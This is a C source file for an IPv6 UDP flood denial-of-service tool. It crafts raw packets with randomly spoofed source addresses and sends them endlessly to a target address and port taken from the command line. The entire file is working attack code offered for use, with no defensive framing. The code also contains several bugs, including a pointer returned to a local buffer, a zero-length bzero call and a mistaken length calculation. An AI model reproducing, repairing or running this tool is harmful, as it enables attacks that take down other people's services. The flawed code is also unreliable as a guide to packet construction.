/*
	UDP Flood ipv6 DDOS
*/
#include <stdio.h>
#include <string.h> //memset
#include <sys/socket.h>
#include <stdlib.h>      //for exit(0);
#include <errno.h>       //For errno - the error number
#include <linux/tcp.h>   //Provides declarations for tcp header
#include <linux/udp.h>   //Provides declarations for udp header
#include <netinet/ip.h>  //Provides declarations for ip header
#include <netinet/ip6.h> //Provides declarations for ip header
#include <time.h>

typedef long long ll;

unsigned short checksum(void *b, int len)
{
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

char *convertToHex(int num)
{
    int x;
    char hexadecimalnum[4];
    int j = 3;
    while (num != 0)
    {
        x = num % 16;
        if (x < 10)
            hexadecimalnum[j--] = '0' + x;
        else
        {
            x = x % 10;
            hexadecimalnum[j--] = 'a' + x;
        }
        num = num / 16;
    }
    char *hex = hexadecimalnum;
    return hex;
}

void randonIP(char *ip)
{
    int lower = 0;
    int upper = 65535;
    int j = 0;
    for (int i = 1; i <= 8; i++)
    {
        int num = (rand() % (upper - lower)) + lower;
        char *numHex = convertToHex(num);
        ip[j++] = numHex[0];
        ip[j++] = numHex[1];
        ip[j++] = numHex[2];
        ip[j++] = numHex[3];
        if (i < 8)
        {
            ip[j++] = ':';
        }
    }
    ip[j] = '\0';
    printf("%s\n", ip);
}

void DdosUDP(char *ipdest, unsigned int port)
{
    printf("udp\n%s\n%d\n", ipdest, port);
    //Create a raw socket
    int s = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
    if (s < 0)
    {
        perror("cann't open socket");
    }

    //Datagram to represent the packet
    char datagram[sizeof(struct ip6_hdr) + sizeof(struct udphdr)], source_ip[40];
    //IP header
    struct ip6_hdr *iph = (struct ip6_hdr *)datagram;
    //UDP header
    struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct ip6_hdr));
    struct sockaddr_in6 addr;

    addr.sin6_family = AF_INET6;
    addr.sin6_port = 0;
    addr.sin6_flowinfo = 0;
    addr.sin6_scope_id = 0;
    inet_pton(AF_INET6, ipdest, &(addr.sin6_addr));

    bzero(datagram, 0);

    //Fill in the IP Header
    inet_pton(AF_INET6, ipdest, &(iph->ip6_dst));
    iph->ip6_flow = htonl((6 << 28) | (0 << 20) | 0); //default 0 flow
    iph->ip6_plen = htons(sizeof(struct ip6_hdr *) + sizeof(struct udphdr *));
    iph->ip6_nxt = IPPROTO_UDP;
    iph->ip6_hops = 128;

    //UDP Header
    udph->source = htons(1234);
    udph->dest = htons(port);
    udph->len = htons(sizeof(struct udphdr));
    udph->check = 0; /* if you set a checksum to zero, your kernel's IP stack
				should fill in the correct checksum during transmission */
    //Now the IP checksum
    udph->check = checksum(datagram, sizeof(datagram));

    //IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt(s, IPPROTO_IPV6, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        printf("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n", errno, strerror(errno));
        exit(0);
    }

    while (1)
    {
        randonIP(source_ip);
        inet_pton(AF_INET6, source_ip, &(iph->ip6_src));

        //Send the packet
        if (sendto(s,                        /* our socket */
                   datagram,                 /* the buffer containing headers and data */
                   sizeof(datagram),            /* total length of our datagram */
                   0,                        /* routing flags, normally always 0 */
                   (struct sockaddr *)&addr, /* socket addr, just like in */
                   sizeof(addr)) < 0)        /* a normal send() */
        {
            printf("error\n");
        }
        //Data send successfully
        else
        {
            printf("Packet Send \n");
        }
    }
}

int main(int argv, char *args[])
{
    srand(time(NULL));

    unsigned int port = 443;
    char ipdest[40] = "::1";
    if (argv > 1)
    {
        for (size_t i = 0; i < argv; i++)
        {
            if (strcmp(args[i], "-t") == 0)
            {
                i++;
                strncpy(ipdest, args[i], 40);
                int len = strlen(ipdest);
                if (len < 3 || len > 40 - 1)
                {
                    printf("the ip address %s is invalid\n", ipdest);
                    exit(0);
                }
            }
            if (strcmp(args[i], "-p") == 0)
            {
                char *portString = args[++i];
                for (int j = 0; j < strlen(portString); j++)
                {
                    if (ipdest[i] < '0' || ipdest[i] > '9')
                    {
                        perror("invalid argument");
                    }
                }
                port = atoi(portString);
            }
        }
    }
    DdosUDP(ipdest, port);
    return 0;
}